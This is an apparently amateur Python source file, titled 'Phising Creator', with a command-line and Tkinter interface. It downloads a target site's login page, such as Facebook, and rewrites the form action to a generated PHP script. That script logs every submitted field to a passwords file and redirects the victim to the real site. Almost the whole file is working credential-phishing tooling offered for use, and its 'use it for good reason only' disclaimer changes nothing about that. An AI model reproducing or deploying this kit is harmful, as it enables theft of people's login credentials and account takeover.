import urllib.request as urllib # sorry this is my first program on python 3.x 
import os
import tkinter
from tkinter import messagebox

acnum = -1
methnum = -1
SiteSource = 'no!'
savedir = os.getcwd()
passfile = 'passwords.txt'
postfile = 'post.php'
indexfile = 'index.php'
foldername = 'files_for_phising'
sitename = "no!"
method = "post"




#Help
def help():
    print('This program created by Giannio')
    print('Use it for good reason only')
    print('You can give the following commands:')
    print('Help: display the commands of the program')
    print('view source code: display the source code of the site')
    print('view files: display the files of the program')
    print('view save dir:view the saved directory')
    print('view method: display the method that will be set')
    print('site: the target site (example: site=https://www.facebook.com)')
    print('dir: path to save the files (example: dir=C:\desktop')
    print('pass: the file who store the passwords(example: pass=passwords.txt')
    print('post: the file who takes argument\'s (example: post=post.php')
    print('index: the page of the site(example: index=index.php')
    print('method: set the method to the source (example method=GET)')
    print('build: Create the phising site')
    print('GUI: Start the graphical environment')

def site(x):
    global SiteSource
    global sitename
    global acnum
    global methnum
    
    num = x.find('http')
    if num == -1:
        print('[-]Error: missing http on site url')
        return 'Error: missing http on site url'
    siteurl = x[num:]
    
    print('[+]Reading data: %s'%siteurl)
    try:
        site  = urllib.urlopen(siteurl)
        data = site.read()
        data = str(data)
        print('[+]Site source code readed succesfully')
        
        if data.find('action='):
            acnum1 = data.find('action=')
        elif data.find('action ='):
            acnum1 = data.find('action =') + 1

        if data.find('method='):
            methnum1 = data.find('method=')
        elif data.find('method ='):
            methnum1 = data.find('method =') + 1
            
        
        if acnum1 == -1:
            print('[-]Error: Unable to find the action= in source code')
            return 'Unable to find the action= in source code'
        elif methnum1 == -1:
            print('[-]Error: unable to find the method= in source code')
            return 'unable to find the method= in source code'
        
        SiteSource = data
        sitename = siteurl
        acnum = acnum1
        methnum = methnum1
        
    except:
        print('[-]Oups somthing didn\'t go well')
        return 'Oups somthing didn\'t go well'

    return 'sucesfully'

def changedir(x):
    global savedir
    dnum = x.find('=')
    direc = x[dnum+1:]
    if len(direc) == 0:
        print('[-]Error on command')
        print(r'[!]command example: dir=c:\test\test')
        return 0
    if os.path.isdir(direc) == False:
        print('[-]There is no such directory')
        return 0

    savedir = direc
    print('[+] Save directory succesfully changed!')
    
def changepass(x):
    global passfile
    pnum = x.find('=')+1
    passname = x[pnum:]

    if len(passname) == 0:
        print('[-]Error on command')
        print(r'[!]example: pass=password.txt')
        return 0
    
    passfile = passname
    print('[+] password file name sucesfully changed!')


def changepost(x):
    global postfile
    postname = x[x.find('=')+1:]
    if len(postname) == 0:
        print('[+]Error on command')
        print(r'[!]example: post=post.php')
        return 0
    postfile = postname

    print('[+] post file name sucesfully changed!')
    
def changeindex(x):
    global indexfile
    
    indexname = x[x.find('=')+1:]
    
    if len(indexname) == 0:
        print('[-]Error on command')
        print(r'[!]example: index=index.php')
        return 0
    
    indexfile = indexname
    print('[+] Page name sucesfully changed!')

def changefolder(x):
    global foldername
    
    folder = x[x.find('=')+1:]
    
    if len(folder) == 0:
        print('[-]Error on command')
        print(r'[!]example: folder=files')
        return 0
    
    foldername = folder
    print('[+] Folder name sucesfullt changed!')
def changemethod(x):
    global method
    n = x.find('=')+1
    meth = x[n:]

    if len(meth) == 0:
        print('[-]Error on command!')
        print('[!]example: method=GET')
        return 0

    method = meth
    
    
def build():
    global acnum
    global methnum
    global SiteSource
    global savedir
    global passfile
    global postfile
    global indexfile
    global foldername
    global sitename
    global method

    #errors--
    if SiteSource=='no!':
        print('[-]Error: You haven\'t set the target site')
        return 'Error: You haven\'t set the target site'
    elif acnum == -1:
        print('[-]Error: Unable to find the action= on source code')
        return 'Error: Unable to find the action= on source code'
    elif methnum == -1:
        print('[-]Error: unable to find the method= on source coe')
        return 'Error: unable to find the method= on source coe'

    

    datadir = savedir+os.sep+foldername+os.sep
    
    if os.path.isdir(datadir) == False:
        os.mkdir(datadir)

    open(datadir+passfile,'w').write('#Accounts:\n\n')

    postsource = '<?php\n\
header (\'Location:'+sitename+ '\');\n\
$handle = fopen("'+passfile+'", "a");\n\
foreach($_POST as $variable => $value) {\n\
fwrite($handle, $variable);\n\
fwrite($handle, "=");\n\
fwrite($handle, $value);\n\
fwrite($handle, "\\r\\n");\n\
}\n\
fwrite($handle, "\\r\\n");\n\
fclose($handle);\n\
exit;\n\
?>\n'

    open(datadir+postfile,'w').write(postsource)


    open(datadir+postfile,'w').write(postsource)

    if SiteSource.find('method="get"') != -1:
        SiteSource = SiteSource.replace('method="get"','method="'+method+'"')
    elif SiteSource.find("method='get'") != -1:
        SiteSource = SiteSource.replace("method='get'",'method="'+method+'"')
    elif SiteSource.find('method="post"'):
        SiteSource = SiteSource.replace('method="post"','method="'+method+'"')
    elif SiteSource.find("method='post'"):
        SiteSource = SiteSource.replace("method='post'",'method="'+method+'"')
    else:
        x = 0
        i = 5
        first=0
        second=0
        while(x != 2):
            i += 1
            curletter = SiteSource[methnum + i]
            if curletter == '"' or curletter == "'":
                if x == 0:
                    x = 1
                    first = methnum + i
                else:
                    x = 2
                    second = methnum + i
                    
        SiteSource = SiteSource[:first] + '"post"' + SiteSource[second+1:]
            
    #-.- we need to find again the action becouse the method= have change
        #the number 

    if SiteSource.find('action=') != -1:
        acnum = SiteSource.find('action=')
    elif SiteSource.find('action =') != -1:
        acnum = SiteSource.find('action =') + 1

    #now let's create it

    x = 0
    i = 4
    first=0
    second=0
    while(x != 2):
        i += 1
        curletter = SiteSource[acnum + i]
        if curletter == '"' or curletter == "'":
            if x == 0:
                x = 1
                first = acnum + i
            else:
                x = 2
                second = acnum + i
                    
    SiteSource = SiteSource[2:first] + '"' + postfile + '"' + SiteSource[second+1:]
    SiteSource = SiteSource.replace('\\n','\n')    
    open(datadir+indexfile,'w').write(SiteSource)   

    print('[+]Phising site succesfully completed!')
    print('[+]Now you are redy to unpload the files on your server!')

    return 'Succesfully'

def guibuild(url,meth,post,pas,indx,save,fold):
    global method
    global postfile
    global passfile
    global indexfile
    global savedir
    global foldername

    method = meth
    postfile = post
    passfile = pas
    indexfile = indx
    savedir = save
    foldername = fold

    x = site(url)
    x = x.lower()

    print(x)

    if x.find('error') != -1 or x.find('oups') != -1:
        messagebox.showerror('Error',x)
        return 0

    x = build()
    x = x.lower()

    if x.find('error') != -1:
        messagebox.showerror('Error',x)
        return 0
    else:
        messagebox.showinfo('INFO','Completed :)')

    

    
    
def gui():
    global method
    global postfile
    global passfile
    global indexfile
    global savedir
    global foldername

    
    

    root = tkinter.Tk()
    root.title('Phising Creator')
    frame = tkinter.Frame(root,width=250,height=210)
    frame.pack()

    messagebox.showinfo('INFO','The Graphical environment lag\'s so be patient')


    tkinter.Label(frame,text='Phising Creator By Giannio').place(x=1,y=5)
    tkinter.Label(frame,text='Use it only for good reason').place(x=1,y=20)

    tkinter.Label(frame,text='Site:').place(x=1,y=40)
    sitebox = tkinter.Entry(frame,width=20)
    sitebox.place(x=80,y=40)

    tkinter.Label(frame,text='Method:').place(x=1,y=60)
    methbox = tkinter.Entry(frame,width=20)
    methbox.place(x=80,y=60)

    tkinter.Label(frame,text='Post file:').place(x=1,y=80)
    postbox = tkinter.Entry(frame,width=20)
    postbox.place(x=80,y=80)

    tkinter.Label(frame,text='pass file:').place(x=1,y=100)
    passbox = tkinter.Entry(frame,width=20)
    passbox.place(x=80,y=100)

    tkinter.Label(frame,text='Index file:').place(x=1,y=120)
    indexbox = tkinter.Entry(frame,width=20)
    indexbox.place(x=80,y=120)

    tkinter.Label(frame,text='Save directory:').place(x=1,y=140)
    dirbox = tkinter.Entry(frame,width=20)
    dirbox.place(x=80,y=140)
    
    tkinter.Label(frame,text='folder name:').place(x=1,y=160)
    folderbox = tkinter.Entry(frame,width=20)
    folderbox.place(x=80,y=160)

    methbox.insert(0,method)
    postbox.insert(0,postfile)
    passbox.insert(0,passfile)
    indexbox.insert(0,indexfile)
    dirbox.insert(0,savedir)
    folderbox.insert(0,foldername)

    tkinter.Button(frame,width=40,text='Build Phising Site',command = lambda: guibuild(sitebox.get(),methbox.get(),postbox.get(),passbox.get(),indexbox.get(),dirbox.get(),folderbox.get())).place(x=1,y=185)

    root.mainloop()
    
    
    

def main():
    print('[!]If you don\'t how to use this program press help\n\n')
    while(True): #main menu
    
        command = str(input('>> '))
        command = command.lower()

        if command.find('help') != -1:
            help()
        elif command.find('site=') != -1:
            site(command)
        elif command.find('view source code') != -1:
            print(SiteSource)
        elif command.find('view files') != -1:
            print('password file: %s'%passfile)
            print("post file : %s"%postfile)
            print("site page : %s"%indexfile)
            print('folder name: %s'%foldername)
        elif command.find('view save dir') != -1:
            print('Directory path:  %s'%savedir)
        elif command.find('dir=') != -1:
            changedir(command)
        elif command.find('pass=') != -1:
            changepass(command)
        elif command.find('post=') != -1:
            changepost(command)
        elif command.find('index=') != -1:
            changeindex(command)
        elif command.find('folder=') != -1:
            changefolder(command)
        elif command.find('build') != -1:
            build()
        elif command.find('exit') != -1:
            break
        elif command.find('method=') != -1:
            changemethod(command)
        elif command.find('view method') != -1:
            print(method)
        elif command.find('gui') != -1:
            gui()
        else:
            print('Wrong command')

if __name__ == '__main__':
    main()
